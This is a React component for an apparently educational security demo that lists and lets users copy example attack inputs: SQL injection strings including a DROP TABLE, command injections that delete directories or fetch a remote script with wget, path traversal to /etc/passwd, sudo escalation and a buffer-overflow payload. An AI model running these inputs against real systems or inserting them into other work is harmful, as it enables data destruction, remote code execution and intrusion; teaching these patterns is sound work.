import { useState } from "react";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription } from "@/components/ui/alert";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Terminal,
  Shield,
  AlertTriangle,
  Copy,
  CheckCircle,
} from "lucide-react";

// Define the type for vulnerabilities
type Vulnerability = {
  title: string;
  description: string;
  examples: { input: string; description: string }[];
};

export default function DemoCode() {
  const [selectedVuln, setSelectedVuln] = useState<string | undefined>("");
  const [copied, setCopied] = useState<string>("");

  const vulnerabilities: { [key: string]: Vulnerability } = {
    privilege: {
      title: "Privilege Escalation Demo",
      description: "Common privilege escalation techniques",
      examples: [
        { input: "sudo -l", description: "List sudo privileges" },
        { input: "sudo bash", description: "Attempt privilege escalation" },
      ],
    },
    sql: {
      title: "SQL Injection Simulation",
      description: "Demonstrates common SQL injection patterns",
      examples: [
        { input: "' OR '1'='1", description: "Basic authentication bypass" },
        {
          input: "'; DROP TABLE users--",
          description: "Destructive query injection",
        },
      ],
    },
    command: {
      title: "Command Injection Simulation",
      description: "Shows how command injection can occur",
      examples: [
        {
          input: "; rm -rf /important-directory",
          description: "Malicious command concatenation",
        },
        {
          input: "|| wget malicious-script.sh",
          description: "Remote script execution",
        },
      ],
    },
    traversal: {
      title: "Directory Traversal Demo",
      description: "Path traversal vulnerability examples",
      examples: [
        {
          input: "../../../../../etc/passwd",
          description: "System file access attempt",
        },
        {
          input: "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
          description: "Encoded traversal attempt",
        },
      ],
    },
    buffer: {
      title: "Buffer Overflow Simulation",
      description: "Buffer overflow vulnerability demonstration",
      examples: [
        {
          input:
            "gcc -fno-stack-protector -z execstack buffer_overflow.c -o buffer_overflow",
          description: "Compile vulnerable program",
        },
        {
          input: "perl -e 'print \"A\" x 100'",
          description: "Generate buffer overflow payload",
        },
      ],
    },
  };

  const copyToClipboard = (text: string, index: number) => {
    navigator.clipboard.writeText(text);
    setCopied(`${selectedVuln}-${index}`);
    setTimeout(() => setCopied(""), 2000);
  };

  return (
    <div className="w-full max-w-5xl mx-auto p-4 space-y-6">
      <Alert className="bg-yellow-50 flex items-center [&>svg+div]:translate-y-0 [&>svg]:relative [&>svg]:left-0 [&>svg]:top-0 border-yellow-200">
        <AlertTriangle className="h-4 w-4 !text-yellow-600" />
        <AlertDescription className="text-yellow-800 pl-0">
          Educational purpose only. Use in controlled environments.
        </AlertDescription>
      </Alert>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Shield className="h-6 w-6" />
            Security Vulnerability Demonstrations
          </CardTitle>
          <CardDescription>
            Select a vulnerability type to see example attack patterns
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Select
            onValueChange={(value) => setSelectedVuln(value)}
            value={selectedVuln}
          >
            <SelectTrigger className="w-full mb-6">
              <SelectValue placeholder="Select vulnerability type" />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="sql">SQL Injection</SelectItem>
              <SelectItem value="command">Command Injection</SelectItem>
              <SelectItem value="traversal">Directory Traversal</SelectItem>
              <SelectItem value="buffer">Buffer Overflow</SelectItem>
              <SelectItem value="privilege">Privilege Escalation</SelectItem>
            </SelectContent>
          </Select>

          {selectedVuln && vulnerabilities[selectedVuln] && (
            <Card className="border-dashed">
              <CardHeader>
                <CardTitle className="text-lg">
                  {vulnerabilities[selectedVuln].title}
                </CardTitle>
                <CardDescription>
                  {vulnerabilities[selectedVuln].description}
                </CardDescription>
              </CardHeader>
              <CardContent>
                <Accordion type="single" collapsible>
                  {vulnerabilities[selectedVuln].examples.map(
                    (example, index) => (
                      <AccordionItem key={index} value={`item-${index}`}>
                        <AccordionTrigger>
                          {example.description}
                        </AccordionTrigger>
                        <AccordionContent>
                          <div className="relative mt-2">
                            <div className="rounded-md bg-black p-4 overflow-x-auto">
                              <div className="flex items-center gap-2">
                                <Terminal className="h-4 w-4 text-white" />
                                <code className="text-white font-mono">
                                  {example.input}
                                </code>
                              </div>
                            </div>
                            <Button
                              size="sm"
                              variant="outline"
                              className="absolute right-2 top-2"
                              onClick={() =>
                                copyToClipboard(example.input, index)
                              }
                            >
                              {copied === `${selectedVuln}-${index}` ? (
                                <CheckCircle className="h-4 w-4 text-green-500" />
                              ) : (
                                <Copy className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                        </AccordionContent>
                      </AccordionItem>
                    )
                  )}
                </Accordion>
              </CardContent>
            </Card>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
